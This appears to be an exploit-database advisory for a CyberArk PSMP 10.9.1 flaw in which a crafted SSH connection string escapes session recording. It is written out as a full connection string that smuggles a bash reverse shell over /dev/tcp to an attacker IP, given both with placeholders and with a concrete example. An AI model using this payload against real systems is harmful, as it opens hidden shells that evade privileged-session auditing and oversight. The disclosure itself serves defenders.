@@ -1,0 +1,93 @@
+# Exploit Title: CyberArk PSMP 10.9.1 - Policy Restriction Bypass
+# Google Dork: NA
+# Date: 2020-02-25
+# Exploit Author: LAHBAL Said
+# Vendor Homepage: https://www.cyberark.com/
+# Software Link: https://www.cyberark.com/
+# Version: PSMP <=10.9.1
+# Tested on: PSMP 10.9 & PSMP 10.9.1
+# CVE : N/A
+# Patched : PSMP >= 11.1
+
+[Prerequisites]
+
+Policy allows us to overwrite PSMRemoteMachine
+
+[Description]
+An issue was discovered in CyberArk Privileged Session Manager SSH Proxy
+(PSMP)
+through 10.9.1.
+All recordings mechanisms (Keystoke, SSH Text Recorder and video) can be
+evaded
+because users entries are not properly validated.
+Commands executed in a reverse shell are not monitored.
+The connection process will freeze just after the "session is being
+recorded" banner and the all commands we enter are not monitored.
+
+------------------------------------------
+
+[Additional Information]
+We can got a reverse shell (or execute any command we want) from remote
+target and be completely invisible from CyberArk. In logs, we have only
+both PSMConnect and PSMDisconnect events.
+Here are details of the attack :
+1. I connect through CyberArk PSMP server using this
+connection string : ssh <vaultUserName>%username+address%'remoteMachine
+bash -i >& /dev/tcp/<AttackerIP>/<AttackerPort0>&1'@<psmpServer>
+Example : ssh slahbal%sharedLinuxAccount+test.intra%'linux01 bash -i >&
+/dev/tcp/192.168.0.10/443 0>&1'@psmp
+3. This connection string will :
+- Connect me to linux01 using sharedLinuxAccount account that is stored
+into CyberArk and to which I have access.
+- Create a reverse shell to my workstation 192.168.0.10:443 (nc.exe is
+listening on port 443 for this test).
+4. The connection process will freeze just after "The sessions is being
+recorded" banner
+5. I got a reverse shell on which all commands ar not monitored.
+Note 1 : The command that created the reverse shell is NOT captured by
+CyberArk.
+Note 2 : sshd_config has been set with those parameters :
+PSMP_AdditionalDelimiter %
+PSMP_TargetAddressPortAdditionalDelimiter +
+
+------------------------------------------
+
+[VulnerabilityType Other]
+Bypass all recordings mechanisms (Keystoke, SSH Text Recorder and video)
+
+------------------------------------------
+
+[Vendor of Product]
+CyberArk
+
+------------------------------------------
+
+[Affected Product Code Base]
+PSMP - <=10.9.1
+
+------------------------------------------
+
+[Affected Component]
+/opt/CARKpsmp/bin/psmpserver
+
+------------------------------------------
+
+[Attack Type]
+Local
+
+------------------------------------------
+
+[CVE Impact Other]
+The vulnerability allow you to connect through CyberArk PSMP server
+bypassing all recordings mechanisms
+
+------------------------------------------
+
+[Attack Vectors]
+To exploit the vulnerability, someone must connect through PSMP using a
+crafted connection string.
+
+------------------------------------------
+
+[Has vendor confirmed or acknowledged the vulnerability?]
+true
